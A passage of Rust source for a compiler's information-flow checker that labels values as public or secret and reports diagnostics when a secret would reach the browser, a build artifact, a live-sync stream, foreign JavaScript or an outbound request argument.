            if !matches!(def.kind, DefKind::Function(_)) {
                continue;
            }
            let uncalled = !self
                .split
                .reached_by
                .keys()
                .any(|(called, _)| *called == id);
            if !uncalled {
                continue;
            }
            let contexts: Vec<Ctx> = self
                .split
                .contexts
                .get(&id)
                .map(|set| set.iter().copied().collect())
                .unwrap_or_default();
            for ctx in contexts {
                let summary = self.solve_function(id, ctx, true, 0);
                let obligations: Vec<Obligation> = summary
                    .obligations
                    .into_values()
                    .map(|mut obligation| {
                        obligation.found = obligation.found.instantiate(&[]);
                        obligation.pc = obligation.pc.instantiate(&[]);
                        obligation
                    })
                    .collect();
                self.discharge_all(
                    obligations
                        .into_iter()
                        .map(|o| ((o.site, o.kind), o))
                        .collect::<BTreeMap<_, _>>(),
                );
            }
        }
    }

    fn discharge_signal(&mut self, def: DefId, ctx: Ctx) {
        let DefKind::Signal(signal) = &self.hir.defs[def].kind else {
            return;
        };
        // A durable or static signal's initialiser is evaluated only in
        // the BUILD root (§17.2.5 fatal 5), and the split has already
        // recorded that by giving it another form everywhere else.
        let init = signal.init;
        let placement = placement_of(signal.placement);
        let emitted = signal.emits.as_ref().map(|e| (e.path.clone(), e.span));
        let mut walk = Walk::new(self, ctx, def, true, 0);
        let value = walk.expr(init);
        let obligations = std::mem::take(&mut walk.obligations);

        let required = self.declared.get(&def).copied().unwrap_or_default().value;
        let sink_site = SinkSite::ClientSignal(def);
        let is_client_state = matches!(placement, SignalPlacement::Client);

        let kind = if is_client_state {
            ObligationKind::Escape(Sink::ClientState, sink_site)
        } else {
            ObligationKind::Declaration(def)
        };
        let mut all = obligations;

        // Sink 3 — §14G.1.3(c). A `static` signal declared `emitting`
        // writes its value into a file in the bundle, which anyone who
        // fetches the site can read. The split records the edge; this is
        // where it is ruled on, against the **computed** label rather than
        // the declared one, so a value that merely *derives* from a secret
        // is caught too.
        let writes_a_file =
            self.split.boundary.iter().any(
                |edge| matches!(edge, BoundaryEdge::BuildOutput { def: at, .. } if *at == def),
            );
        if let (true, Some((path, span))) = (writes_a_file, emitted) {
            // Keyed on `(span, kind)` like every other obligation: a span
            // alone is not unique, because two component instances share
            // the span of the declaration they were copied from, and a
            // bare-span key would let one instance's obligation displace
            // the other's.
            let emits = ObligationKind::Escape(Sink::BuildArtifact, SinkSite::BuildOutput(def));
            all.insert(
                (span, emits),
                Obligation {
                    kind: emits,
                    required: Secrecy::Public,
                    found: value.label.value.clone(),
                    pc: Sym::bottom(),
                    site: span,
                    what: format!("`{}`, written to `{path}`", self.hir.defs[def].name),
                    found_trace: value.trace.clone(),
                    pc_trace: Vec::new(),
                },
            );
        }

        all.insert(
            (self.hir.defs[def].span, kind),
            Obligation {
                kind,
                required,
                found: value.label.value.clone(),
                pc: Sym::bottom(),
                site: self.hir.exprs[init].span,
                what: format!("`{}` is declared", self.hir.defs[def].name),
                found_trace: value.trace,
                pc_trace: Vec::new(),
            },
        );
        self.discharge_all(all);
    }

    /// Diagnostics a walk raised directly, deduplicated against what has
    /// already been reported.
    fn report_all(&mut self, errors: BTreeMap<Span, GraphError>) {
        for error in errors.into_values() {
            let already = self
                .out
                .diagnostics
                .iter()
                .any(|d| d.code == error.code && d.span == error.span);
            if !already {
                self.out.diagnostics.push(error);
            }
        }
    }

    fn discharge_all(&mut self, obligations: BTreeMap<ObligationId, Obligation>) {
        for obligation in obligations.into_values() {
            let found = obligation.found.concrete().join(obligation.pc.concrete());
            if found.flows_to(obligation.required) {
                if let ObligationKind::Escape(sink, site) = obligation.kind {
                    self.out.cleared.insert((sink, site));
                }
                continue;
            }
            self.out.diagnostics.push(self.render(&obligation));
        }
    }

    fn render(&self, obligation: &Obligation) -> GraphError {
        let notes = merge(&obligation.found_trace, &obligation.pc_trace);
        match obligation.kind {
            ObligationKind::Declaration(def) => GraphError::new(
                "E-IFC-02",
                format!(
                    "this derivation is secret, but `{}` is not declared secret.",
                    self.hir.defs[def].name
                ),
                obligation.site,
            )
            .with_notes(notes),
            ObligationKind::Write(def) => GraphError::new(
                "E-IFC-03",
                format!(
                    "a secret is written into `{}`, which is {}.",
                    self.hir.defs[def].name,
                    self.declared
                        .get(&def)
                        .copied()
                        .unwrap_or_default()
                        .value
                        .describe()
                ),
                obligation.site,
            )
            .with_notes(notes),
            ObligationKind::Escape(sink, _) => GraphError::new(
                sink.code(),
                format!(
                    "{} would reach {}, and {}.",
                    obligation.what,
                    sink.describe(),
                    sink.because()
                ),
                obligation.site,
            )
            .with_notes(notes),
            // No repair is offered that keeps the call. There is none: the
            // module is opaque and runs in the browser, so "pass it
            // differently" does not exist and suggesting one would be
            // advice that cannot be followed.
            ObligationKind::ForeignArgument(def, index) => GraphError::new(
                "E-IFC-13",
                format!(
                    "{} is passed to `{}`, which is `foreign … is client` — so the value is \
                     handed to JavaScript running in the browser.",
                    obligation.what, self.hir.defs[def].name
                ),
                obligation.site,
            )
            .with_notes(notes)
            .with_help(format!(
                "`{}` is opaque to the compiler and runs where the reader is, so a secret \
                 reaching it has left the program. Compute what the browser needs on the \
                 server and pass that, or declare the foreign `is server` if it does not \
                 need a DOM. (parameter {})",
                self.hir.defs[def].name,
                index + 1
            )),
        }
    }

    /// Sink 6, from the two structurally different edges the split emits.
    ///
    /// §17.2.5 fatal 4: `watch_keys` conflated "the browser is sent the
    /// value" with "the browser is told the key changed", so a public
    /// aggregate over a `secret` store was either permanently stale or a
    /// live leak. The split does not decide; it emits both edges and this
    /// rules on them.
    fn live_sync(&mut self) {
        for edge in &self.split.boundary {
            let (key, observed, why) = match edge {
                BoundaryEdge::LiveValue { key } => (*key, Obs::Value, "its value is streamed"),
                BoundaryEdge::Invalidate { key, .. } => (
                    *key,
                    Obs::Shape,
                    "the browser is told when it changes, which is an observation of it",
                ),
                // Sinks 1 and 2, not sink 6. A `Remote` result and a view
                // read are ruled on where the browser reads them, by
                // `Walk::read`, which is the only place that knows the
                // `pc` the read stands under — this loop has no walk and
                // so no `pc` to apply. Sink 3 is ruled on in
                // `discharge_signal`, against the value the `emitting`
                // signal computes; sink 5 has no trigger runtime to raise
                // it at all (§17.7). Written out rather than wildcarded so
                // that a new edge cannot be dropped here in silence —
                // which is exactly how `static` initialisers went unwalked.
                BoundaryEdge::RemoteResult { .. }
                | BoundaryEdge::ViewRead { .. }
                | BoundaryEdge::BuildOutput { .. }
                | BoundaryEdge::TriggerFail { .. } => continue,
            };
            let label = self.declared.get(&key).copied().unwrap_or_default();
            let site = SinkSite::LiveSync(key);
            if label.get(observed).flows_to(Secrecy::Public) {
                self.out.cleared.insert((Sink::LiveSync, site));
                continue;
            }
            self.out.diagnostics.push(
                GraphError::new(
                    "E-IFC-10",
                    format!(
                        "`{}` is secret, and {} — so a browser subscribed to the live-sync stream \
                         would learn about it.",
                        self.hir.defs[key].name, why
                    ),
                    self.hir.defs[key].span,
                )
                .with_notes(vec![(
                    self.hir.defs[key].span,
                    format!("`{}` is declared secret", self.hir.defs[key].name),
                )]),
            );
        }
    }
}

/// The allowlist as a diagnostic reads it.
fn allowed_schemes() -> String {
    zdc_hir::URL_SCHEMES
        .iter()
        .map(|scheme| format!("`{scheme}`"))
        .collect::<Vec<_>>()
        .join(", ")
}

fn obligations_equal(before: Option<&Summary>, after: &Summary) -> bool {
    let Some(before) = before else {
        return false;
    };
    if before.obligations.len() != after.obligations.len() {
        return false;
    }
    before.obligations.iter().all(|(span, left)| {
        after.obligations.get(span).is_some_and(|right| {
            left.found == right.found && left.pc == right.pc && left.required == right.required
        })
    })
}

/// One walk of one body, in one context.
struct Walk<'a, 'b> {
    ifc: &'b Ifc<'a>,
    ctx: Ctx,
    owner: DefId,
    tracing: bool,
    /// How many traced re-solves deep this walk is. A traced walk re-runs
    /// a callee's body so the diagnostic can name the branch *inside* it;
    /// the bound is what stops a recursive function re-solving forever.
    depth: u32,
    locals: BTreeMap<LocalId, Valued>,
    /// The locals that are a component instance's own state (§14D.1).
    ///
    /// A write into one is a write into browser memory, exactly as a write
    /// into a `client` signal is — but its place is a `Res::Local`, so the
    /// `Res::Def` rule in `mutation` would let it past unlabelled.
    local_signals: BTreeSet<LocalId>,
    /// The locals a `Failed` pattern introduced (§14G.1.3(d)).
    ///
    /// Membership is what admits the one exception to §17.6 item 15's
    /// field-insensitivity, and it is the *only* thing that admits it: a
    /// binder is in this set because a `when` arm named the built-in
    /// `Failed` variant, which `zdc-resolve`'s `is_builtin_variant` forbids
    /// a program from redeclaring. A record a program built itself is
    /// never in here, so a user field spelled `code` inherits its record's
    /// label like every other field.
    failure_binders: BTreeSet<LocalId>,
    pc: Sym,
    pc_trace: Trace,
    acc: Valued,
    result: Valued,
    gave: bool,
    obligations: BTreeMap<ObligationId, Obligation>,
    /// The URL-bearing position being evaluated, if any.
    ///
    /// A `server` signal read from the view is a **crossing**, and `read`
    /// raises the escape obligation at the read rather than at whatever
    /// the value is eventually used for. Without this the canonical case —
    /// `Image source is apiKey` — would be reported as reaching the view,
    /// which is the wrong sink and the wrong reason: nothing is rendered,
    /// and the leak happens whether or not the element is ever displayed.
    ///
    /// **This is the only way a `secret` can be spelled in one of these
    /// positions at all**, and it is why the mechanism matters more than
    /// it looks: `secret client` state is E0313, so a secret a browser can
    /// read is always a crossing, and a rule that only inspected the
    /// argument's own label would find `Sym::bottom()` there and pass.
    url_argument: Option<UrlPosition>,
    /// Diagnostics this walk raised that are not obligations.
    ///
    /// An obligation is discharged against a label, so it has to survive
    /// instantiation and be joined with its twins. E-URL-01 is a verdict
    /// on a literal and has neither property, but the walk holds `Ifc`
    /// immutably, so it cannot reach the output directly. Keyed by span so
    /// that a view walked from two roots reports one error rather than
    /// two.
    errors: BTreeMap<Span, GraphError>,
}

impl<'a, 'b> Walk<'a, 'b> {
    fn new(ifc: &'b Ifc<'a>, ctx: Ctx, owner: DefId, tracing: bool, depth: u32) -> Walk<'a, 'b> {
        Walk {
            ifc,
            ctx,
            owner,
            tracing,
            depth,
            locals: BTreeMap::new(),
            local_signals: BTreeSet::new(),
            failure_binders: BTreeSet::new(),
            pc: Sym::bottom(),
            pc_trace: Vec::new(),
            acc: Valued::bottom(),
            result: Valued::bottom(),
            gave: false,
            obligations: BTreeMap::new(),
            url_argument: None,
            errors: BTreeMap::new(),
        }
    }

    /// Whether this expression names a local a `Failed` pattern bound.
    ///
    /// The whole of the field-insensitivity exception is decided here: a
    /// field selection off anything else — a parameter, a loop variable,
    /// a record a program built — takes the ordinary rule.
    fn is_failure_binder(&self, expr: ExprId) -> bool {
        matches!(
            self.ifc.hir.exprs[expr].kind,
            HirExprKind::Ref(Res::Local(local)) if self.failure_binders.contains(&local)
        )
    }

    /// Record which of an arm's binders took the failure observation.
    ///
    /// Called with the arm's own pattern name, so the answer is the same
    /// `pattern_name == "Failed"` test that chose the label — one
    /// decision, not two that can disagree.
    fn note_binders(&mut self, is_failure_arm: bool, binders: &[LocalId]) {
        if !is_failure_arm {
            return;
        }
        self.failure_binders.extend(binders.iter().copied());
    }

    fn push_error(&mut self, error: GraphError) {
        self.errors.entry(error.span).or_insert(error);
    }

    fn trace(&self, steps: Trace) -> Trace {
        if self.tracing {
            steps
        } else {
            Vec::new()
        }
    }

    // --- expressions (§17.3.4's table) ---

    fn expr(&mut self, id: ExprId) -> Valued {
        let span = self.ifc.hir.exprs[id].span;
        match &self.ifc.hir.exprs[id].kind {
            HirExprKind::Number(_)
            | HirExprKind::Text(_)
            | HirExprKind::Truth(_)
            | HirExprKind::Empty => Valued::bottom(),

            // The URL the document was served at. Public by construction:
            // the compiler wrote one file per URL and a visitor asked for
            // one of them, so nothing about it was ever a secret. Its
            // *integrity* is the other lattice's question, and
            // `zdc-types`'s §18.1 pass is where it is answered.
            HirExprKind::Address => Valued::bottom(),

            // Whether the browser matches a media query. Public by
            // construction and for the same reason `address` is: the
            // answer is the visitor's own display preference, held by the
            // visitor, and this expression tells the program something the
            // browser already knew. Its *integrity* is the other lattice's
            // question, and `integrity.rs` answers it Untrusted.
            HirExprKind::Media(_) => Valued::bottom(),
            // Bottom for the same reason `media` is: how far the reader has
            // scrolled is the reader's own, held by them, and this tells
            // the program something the browser already knew. Its
            // *integrity* is the other lattice's question, and
            // `integrity.rs` answers it Untrusted.
            HirExprKind::Scroll => Valued::bottom(),
            // §14G.1.3(c) sink 7, reached from its second producing site.
            //
            // Every argument is obliged **separately**, and the value of
            // the request itself is Public: the body is an answer a host
            // gave, which anybody who can make the same request can read,
            // so there is nothing about it for this lattice to protect.
            // What it is worth in the *other* lattice is Untrusted, and
            // `Integrity::flow` is where that is said.
            HirExprKind::Outbound { destination, args } => {
                let (destination, args) = (destination.clone(), args.clone());
                for arg in &args {
                    let (name, value) = match arg {
                        HirArg::Named { name, value } => (name.clone(), *value),
                        // Resolution refuses a positional argument on a
                        // request, so this cannot be reached from source.
                        // Obliged anyway rather than skipped: an arm that
                        // silently sent nothing to the sink is how a sink
                        // stops covering a route.
                        HirArg::Positional(value) => (String::new(), *value),
                    };
                    // Set before the walk, not after, for the reason the
                    // element's is: a `server` read inside this argument
                    // raises its own escape and has to know which sink it
                    // is escaping to.
                    let outer = self.url_argument.replace(UrlPosition::RequestArgument {
                        expr: value,
                        argument: name.clone(),
                        destination: destination.clone(),
                    });
                    let found = self.expr(value);
                    self.url_argument = outer;
                    self.require_no_outbound_argument(
                        &found,
                        value,
                        &name,
                        &destination,
                        self.ifc.hir.exprs[value].span,
                    );
                }
                Valued::bottom()
            }

            // Unconditionally Secret. Otherwise omitting the `secret`
            // keyword launders a credential, and §5.6 already confines
            // `environment` to server context.
            HirExprKind::Environment(key) => Valued::of(
                SymLabel::declared(Label::scalar(Secrecy::Secret)),
                self.trace(vec![(
                    span,
                    format!("`environment \"{key}\"` is always secret"),
                )]),
            ),

            HirExprKind::Ref(Res::Local(local)) => {
                self.locals.get(local).cloned().unwrap_or_default()
            }
            HirExprKind::Ref(Res::Def(def)) => {
                let def = *def;
                if matches!(self.ifc.hir.defs[def].kind, DefKind::Signal(_)) {
                    self.read(def, id, span)
                } else {
                    Valued::bottom()
                }
            }
            // §19.2 rule 12, applied to the only opaque call this compiler
            // has: the result joins the argument's `value` label into both
            // `shape` and `value` rather than laundering it. `build read
            // apiKeyPath` is as secret as the path was.
            //
            // **No integrity label is emitted, deliberately.** §18.1's rule
            // — a foreign's integrity is the join of its arguments — was
            // refuted on 2026-08-03 because it assumes the result is a
            // function of the arguments, and a capability's result is a
            // function of the *filesystem*. No integrity lattice exists in
            // this crate, so emitting nothing costs nothing and pre-empts
            // the unsound rule. What a later lattice must not conclude is
            // that this is trusted: a file read at build time is content
            // the author did not write, and `static` having no browser
            // attached is a claim about *when*, not about *who*.
            HirExprKind::Build {
                capability,
                argument,
            } => {
                let (capability, argument) = (*capability, *argument);
                let inner = self.expr(argument);
                Valued::of(
                    SymLabel::triple(inner.label.value.clone()),
                    merge(
                        &inner.trace,
                        &self.trace(vec![(
                            span,
                            format!(
                                "`build {}` is as secret as what it was asked for",
                                capability.name()
                            ),
                        )]),
                    ),
                )
            }
            HirExprKind::Ref(Res::Builtin(_)) => Valued::bottom(),
            // A payload-free variant is a constant tag: it carries no data,
            // so it carries no secret. The same holds for the ones the
            // language provides for `Option` and `Remote`.
            HirExprKind::Ref(Res::Variant { .. } | Res::BuiltinVariant(_)) => Valued::bottom(),

            // A collection literal is a constructor: §17.3.4's rule for one
            // is the join of its operands. Containers are element-
            // insensitive here for the same reason records are field-
            // insensitive above — one label for the collection's shape and
            // one for everything in it jointly — so a secret anywhere
            // inside makes the whole literal secret.
            // **The condition's label joins the result, not just the
            // arms'.** Which value comes out *is* information about the
            // condition, so a public conditional over a secret question
            // would leak the answer one bit at a time — the classic
            // implicit flow, and the reason this is a join of three
            // rather than of two.
            HirExprKind::Conditional {
                condition,
                value,
                otherwise,
            } => {
                let (condition, value, otherwise) = (*condition, *value, *otherwise);
                let asked = self.expr(condition);
                let taken = self.expr(value);
                let other = self.expr(otherwise);
                let mut joined = asked.label.value.clone();
                joined.join_in_place(&taken.label.value);
                joined.join_in_place(&other.label.value);
                let trace = merge(&merge(&asked.trace, &taken.trace), &other.trace);
                Valued::of(SymLabel::triple(joined), trace)
            }
            HirExprKind::List(items) => {
                let items = items.clone();
                let mut joined = Sym::bottom();
                let mut trace = Vec::new();
                for item in items {
                    let element = self.expr(item);
                    joined.join_in_place(&element.label.value);
                    trace = merge(&trace, &element.trace);
                }
                Valued::of(SymLabel::triple(joined), trace)
            }
            HirExprKind::Map(entries) => {
                let entries = entries.clone();
                let mut joined = Sym::bottom();
                let mut trace = Vec::new();
                for (key, value) in entries {
                    let key = self.expr(key);
                    let value = self.expr(value);
                    joined.join_in_place(&key.label.value);
                    joined.join_in_place(&value.label.value);
                    trace = merge(&trace, &key.trace);
                    trace = merge(&trace, &value.trace);
                }
                Valued::of(SymLabel::triple(joined), trace)
            }

            HirExprKind::Call { callee, args } => {
                let callee = *callee;
                let args = args.clone();
                self.call(callee, &args, span)
            }

            // `length of items` is an ordinary call with one argument, so
            // it takes the callee's summary exactly as `Call` does — which
            // is what carries a secret through a library function instead
            // of laundering it.
            HirExprKind::OfCall { callee, operand } => {
                let callee = *callee;
                let args = vec![HirArg::Positional(*operand)];
                self.call(callee, &args, span)
            }
            // A dispatched primitive is a pure function of its operand and
            // has no body to summarise, so the operand's label is the
            // result's. Joining rather than replacing would be the same
            // answer here; propagating it is what keeps `length of secret`
            // secret.
            HirExprKind::Operator { operand, .. } => {
                let operand = *operand;
                let inner = self.expr(operand);
                Valued::of(
                    SymLabel {
                        shape: inner.label.value.clone(),
                        value: inner.label.value.clone(),
                        failure: inner.label.failure.clone(),
                    },
                    inner.trace,
                )
            }
            HirExprKind::Unary { operand, .. } => {
                let operand = *operand;
                let inner = self.expr(operand);
                Valued::of(
                    SymLabel {
                        shape: inner.label.value.clone(),
                        value: inner.label.value.clone(),
                        failure: inner.label.failure.clone(),
                    },
                    inner.trace,
                )
            }
            HirExprKind::Binary { lhs, rhs, .. } => {
                let (lhs, rhs) = (*lhs, *rhs);
                let left = self.expr(lhs);
                let right = self.expr(rhs);
                let joined = left.label.value.join(&right.label.value);
                Valued::of(SymLabel::triple(joined), merge(&left.trace, &right.trace))
            }
            // Records are field-insensitive: one label for the record's
            // existence and one for all its fields jointly. That is the
            // ruling §16.7 item 12 asked for (§17.6 item 15).
            //
            // One exception, and it is not a relaxation of that ruling.
            // `error.code` on a binder a `Failed` pattern introduced is
            // `public`, because `runtime/rpc.js` writes that field from
            // the transport outcome — no response, its own deadline, or
            // the status line — and never from a byte the server sent.
            // Its provenance is the runtime's own control flow, so no
            // join over what the endpoint read describes it.
            //
            // The exception cannot widen by accident. It needs *both* a
            // `Failed` binder, which only the built-in variant produces
            // (`is_builtin_variant` refuses a program that redeclares the
            // name), and the field name the checker types as the runtime
            // one. A record a program built itself has no binder in the
            // set, so its `code` field is field-insensitive like the rest.
            HirExprKind::Field { base, name } => {
                let base = *base;
                let runtime_written = name.as_str() == zdc_types::ERROR_CODE_FIELD;
                if runtime_written && self.is_failure_binder(base) {
                    return Valued::bottom();
                }
                let inner = self.expr(base);
                Valued::of(SymLabel::triple(inner.label.value), inner.trace)
            }
            HirExprKind::Index { base, index } => {
                let (base, index) = (*base, *index);
                let container = self.expr(base);
                let key = self.expr(index);
                let joined = container
                    .label
                    .shape
                    .join(&container.label.value)
                    .join(&key.label.value);
                Valued::of(
                    SymLabel::triple(joined),
                    merge(&container.trace, &key.trace),
                )
            }
            // `append item to list` builds a list literal one element
            // longer, so it labels exactly as `List` does: the result
            // carries the join of what it is made of. Appending a secret
            // to a public list gives a secret list, which is the whole
            // point — a fold that gathers secrets cannot launder them by
            // gathering them one at a time.
            HirExprKind::Append { item, list } => {
                let (item, list) = (*item, *list);
                let element = self.expr(item);
                let rest = self.expr(list);
                let joined = element
                    .label
                    .value
                    .join(&rest.label.shape)
                    .join(&rest.label.value);
                Valued::of(SymLabel::triple(joined), merge(&element.trace, &rest.trace))
            }
            // `set key to value in table` labels as `Map` does, for the
            // reason `append` labels as `List` does: the map that comes
            // out is made of all three operands, so a fold that gathers
            // secrets one entry at a time cannot launder them.
            HirExprKind::Insert { key, value, table } => {
                let (key, value, table) = (*key, *value, *table);
                let written_key = self.expr(key);
                let written_value = self.expr(value);
                let rest = self.expr(table);
                let joined = written_key
                    .label
                    .value
                    .join(&written_value.label.value)
                    .join(&rest.label.shape)
                    .join(&rest.label.value);
                Valued::of(
                    SymLabel::triple(joined),
                    merge(
                        &merge(&written_key.trace, &written_value.trace),
                        &rest.trace,
                    ),
                )
            }
            // `map each x in maybe to …` — the payload transform (#103,
            // #104), and the one expression in the language that binds a
            // name.
            //
            // **The rule that matters is on `shape`, and leaving it out is
            // a laundering hole.** `None`, `Loading` and `Failed` pass
            // through untouched, so the result's *tag* is the container's
            // tag: whether there was anything there is still observable
            // whatever the body did with it. A rule that carried only the
            // body's label would let `map each x in secret to 0` come out
            // Public while still saying whether `secret` was `Some` —
            // which is a one-bit channel out of every secret `Option` in
            // the program, repeated as often as the attacker likes.
            // `flow.rs::a_secret_cannot_be_laundered_through_a_payload_map`
            // fails without the `shape` join below.
            //
            // `failure` carries across for the same reason: a `Remote`'s
            // `Failed` payload is not touched, so it arrives unchanged.
            //
            // `value` is the body's alone, and that is precision rather
            // than a hole: the binder already holds the container's
            // `value` (`bind_element`'s rule, applied here to the
            // payload), so a body that reads the payload has joined it in
            // and a body that ignores it genuinely does not depend on it.
            // Exactly the argument `MapEach` makes one function below.
            HirExprKind::MapInside { var, source, to } => {
                let (var, source, to) = (*var, *source, *to);
                let container = self.expr(source);
                let payload = SymLabel::triple(container.label.value.clone());
                self.locals
                    .insert(var, Valued::of(payload, container.trace.clone()));
                let to = self.expr(to);
                let mut label = SymLabel::triple(to.label.value.clone());
                label.shape.join_in_place(&container.label.shape);
                label.failure.join_in_place(&container.label.failure);
                label.join_all(&self.pc);
                label.settle();
                Valued::of(
                    label,
                    merge(&merge(&container.trace, &to.trace), &self.pc_trace),
                )
            }
        }
    }

    /// §17.3.5 — a lookup, not a table.
    ///
    /// That the dead-code cut and the secrecy check are literally the same
    /// edge is what makes §14A.1's exclusion provable rather than
    /// heuristic. IFC never re-derives §14G.1.4 and never issues a
    /// read-table error; the split already did both.
    fn read(&mut self, signal: DefId, expr: ExprId, span: Span) -> Valued {
        let declared = self.ifc.declared.get(&signal).copied().unwrap_or_default();
        let name = self.ifc.hir.defs[signal].name.clone();
        let declared_at = self.ifc.hir.defs[signal].span;

        match self.ifc.split.crossings.get(&(expr, self.ctx)) {
            Some(Crossing::Remote { endpoint }) => {
                // Crossing back to a browser. This is the one read that is
                // itself a sink — and which sink it is depends on what the
                // browser then does with the value. In a URL-bearing
                // argument it is not shown to anyone; it is fetched.
                let (sink, site, what, escape) = match &self.url_argument {
                    Some(UrlPosition::Attribute { expr: at, argument }) => (
                        Sink::OutboundRequest,
                        SinkSite::UrlArgument(*at, self.ctx),
                        format!("`{name}`, in `{argument}`"),
                        format!(
                            "`{argument}` is a URL, so the browser fetches it — and the value                              names the host  [outbound request]"
                        ),
                    ),
                    Some(UrlPosition::RequestArgument {
                        expr: at,
                        argument,
                        destination,
                    }) => (
                        Sink::OutboundRequest,
                        SinkSite::RequestArgument(*at, self.ctx),
                        format!("`{name}`, in `{argument}`"),
                        format!(
                            "`{argument}` is sent to `{destination}` in the query string  \
                             [outbound request]"
                        ),
                    ),
                    None => (
                        if Some(self.owner) == self.ifc.hir.view {
                            Sink::View
                        } else {
                            Sink::ClientState
                        },
                        SinkSite::ViewArg(expr, self.ctx),
                        format!("`{name}`"),
                        format!("`{name}` is read here, in the browser"),
                    ),
                };
                self.oblige(Obligation {
                    kind: ObligationKind::Escape(sink, site),
                    required: Secrecy::Public,
                    found: Sym::floor(declared.value),
                    pc: self.pc.clone(),
                    site: span,
                    what,
                    found_trace: self.trace(vec![
                        (declared_at, format!("`{name}` is declared secret")),
                        (span, escape),
                    ]),
                    pc_trace: self.pc_trace.clone(),
                });

                let (failure, failure_trace) = self.remote_failure(*endpoint, &name, span);
                Valued::of(
                    SymLabel {
                        shape: Sym::bottom(),
                        value: Sym::bottom(),
                        failure,
                    },
                    // The trace belongs to the `failure` component alone,
                    // and `Valued` carries one trace for all three. That
                    // is sound here because the other two are ⊥: `shape`
                    // reaches only the scrutinee's `require_public`, which
                    // a ⊥ label never trips, and `value` reaches only the
                    // `Ready` and `Loading` binders, which are ⊥ too. The
                    // one path that can cite these steps is the `Failed`
                    // binder, which is what they describe.
                    failure_trace,
                )
            }
            // Every other crossing keeps the value on this side of the
            // boundary, so the read is worth exactly what the signal is
            // declared to be and raises no escape obligation.
            //
            // `Direct` and `Store` stay in this root. `Inline` substitutes
            // a build-time value, which no program can spell today. `Lift`
            // travels browser-to-server, which is the safe direction.
            // `Rejected` and `None` mean the split already refused or
            // never classified the read; treating it as an ordinary read
            // keeps one mistake to one diagnostic. Spelled out rather than
            // wildcarded: a seventh crossing must be ruled on here, not
            // silently absorbed.
            None
            | Some(
                Crossing::Direct
                | Crossing::Inline
                | Crossing::Store { .. }
                | Crossing::Lift { .. }
                | Crossing::Rejected { .. },
            ) => {
                let trace = if declared.value == Secrecy::Secret {
                    self.trace(vec![(declared_at, format!("`{name}` is declared secret"))])
                } else {
                    Vec::new()
                };
                Valued::of(SymLabel::declared(declared), trace)
            }
        }
    }

    /// §14G.1.3(d), corrected — what a `Failed` payload is worth.
    ///
    /// The rule read "the join of the labels of that call's arguments" and
    /// was implemented as the join over `split.params[endpoint]`. Those
    /// two are not the same set. §16.3.12 rule 2 puts a signal in `params`
    /// only when the *server* walk stopped at it, which happens only for a
    /// `client`-placed signal — so `params` is the client-supplied half of
    /// the call and nothing else. The server-placed half, which is where
    /// a credential lives, is not in it: the server walk does not stop at
    /// a `server` read (rule 3), it descends into it and records it as a
    /// *member*. `politeGreeting with name, apiKey` therefore had
    /// `params = [name]` and `members ∋ apiKey`, and the join ran over the
    /// half that carries nothing.
    ///
    /// The corrected join is over **everything the endpoint reads** — its
    /// members as well as its parameters. An HTTP client's error text
    /// routinely contains the request it was making, key and all, so the
    /// failure of an endpoint that read a `secret` is worth that `secret`.
    ///
    /// The trace is built here rather than at the sink because only here
    /// is the endpoint's member set in hand: the sink sees a local binder
    /// and cannot say which declaration put a label on it.
    fn remote_failure(&self, endpoint: RootId, read: &str, span: Span) -> (Sym, Trace) {
        let mut failure = Sym::bottom();
        let mut steps = Vec::new();

        let members = self.ifc.split.members.get(&endpoint);
        let params = self.ifc.split.params.get(&endpoint);
        let inputs = members
            .into_iter()
            .flat_map(|members| members.keys().copied())
            .chain(params.into_iter().flatten().copied());

        for input in inputs {
            let declared = self.ifc.declared.get(&input).copied().unwrap_or_default();
            if declared.value != Secrecy::Secret {
                continue;
            }
            failure = failure.join(&Sym::floor(declared.value));
            let name = &self.ifc.hir.defs[input].name;
            steps.push((
                self.ifc.hir.defs[input].span,
                format!("`{name}` is declared secret, and the endpoint behind `{read}` reads it"),
            ));
        }

        if !failure.is_bottom() {
            steps.push((
                span,
                format!(
                    "so the `Failed` payload of `{read}` is worth what the endpoint read: an \
                     error text is written by the host, which was holding the secret when it \
                     failed  [§14G.1.3(d), failure payload]"
                ),
            ));
        }

        (failure, self.trace(steps))
    }

    /// A constructor — a record literal or a variant carrying a payload.
    ///
    /// §17.3.4's rule for a constructor is the join of its operands, the
    /// same as a collection literal's. Records are field-insensitive
    /// (§17.6 item 15), so a secret in any field makes the whole value
    /// secret; anything weaker would let `Todo with title is apiKey`
    /// launder a credential through a record.
    fn constructed(&mut self, args: &[HirArg]) -> Valued {
        let exprs: Vec<ExprId> = args.iter().map(arg_expr).collect();
        let mut joined = Sym::bottom();
        let mut trace = Vec::new();
        for expr in exprs {
            let arg = self.expr(expr);
            joined.join_in_place(&arg.label.value);
            trace = merge(&trace, &arg.trace);
        }
        Valued::of(SymLabel::triple(joined), trace)
    }

    /// A `foreign`, called for a value or written as a view element.
    ///
    /// §14E.3 row 1: **a `secret` may cross into a foreign only where the
    /// call sits in server context.** A `foreign … is client` is never in
    /// server context by construction, and any foreign reached from a
    /// client root runs in the browser whatever it declared — so the rule
    /// is one condition covering both, and it is `E-IFC-13`.
    ///
    /// The result is the join of the arguments' `value` labels, which is
    /// §19.2 rule 12 and is what `constructed` already computes: after that
    /// replacement a `foreign` cannot declassify, so there is nothing to
    /// special-case on the way out. For `gives view` there is no way out
    /// at all — the handle is consumed by the runtime and never becomes a
    /// ZDeceptron value — so the join is returned and discarded.
    fn foreign(&mut self, def: DefId, args: &[HirArg]) -> Valued {
        let DefKind::Foreign(foreign) = self.ifc.hir.defs[def].kind.clone() else {
            unreachable!("the caller matched on `DefKind::Foreign`");
        };
        let names: Vec<String> = foreign
            .params
            .iter()
            .map(|param| self.ifc.hir.locals[*param].name.clone())
            .collect();

        // Every written argument is walked, in written order and whether or
        // not it matches a parameter: `zdc-types` refuses a call that does
        // not match, but a read inside a stray argument must still reach
        // the read table and E0360 the same way `call` lets it.
        let mut evaluated: Vec<(Option<usize>, ExprId, Valued)> = Vec::new();
        let mut next = 0usize;
        for arg in args {
            let (expr, slot) = match arg {
                HirArg::Positional(expr) => {
                    let slot = (next < names.len()).then(|| {
                        next += 1;
                        next - 1
                    });
                    (*expr, slot)
                }
                HirArg::Named { name, value } => {
                    (*value, names.iter().position(|param| param == name))
                }
            };
            let value = self.expr(expr);
            evaluated.push((slot, expr, value));
        }

        // `is client` and nothing wider, which is §14E.3's own wording and
        // is narrower than it first looks like it should be.
        //
        // "Any foreign reached from a client root" would be the general
        // rule, and it is wrong here for two reasons. Every `zd:` prelude
        // primitive is `is anywhere` (§17.4.10), so the wider rule fires on
